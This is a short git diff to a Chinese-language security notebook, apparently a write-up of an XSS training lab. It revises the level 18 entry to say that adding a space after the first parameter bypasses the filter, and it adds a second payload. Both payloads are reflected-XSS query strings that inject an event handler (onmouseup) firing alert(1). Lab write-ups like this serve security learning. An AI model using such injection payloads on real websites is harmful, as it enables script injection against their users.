@@ -127,9 +127,10 @@ payload：?arg01=a&arg02=b%20onmousedown=alert(1)
 <img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(13).png></br>
 
 ## level 18
-与上一关相同，看了代码也是一样的。</br>
+与上一关相似。这两关也都可以在第一个参数后加空格来绕过。</br>
 ```
-payload：?arg01=a&arg02=b%20onmouseup=alert(1)
+payload1：?arg01=a&arg02=b%20onmouseup=alert(1)
+payload2：?arg01=%20onmouseup&arg02=alert(1)
 ```
 
 ## level19
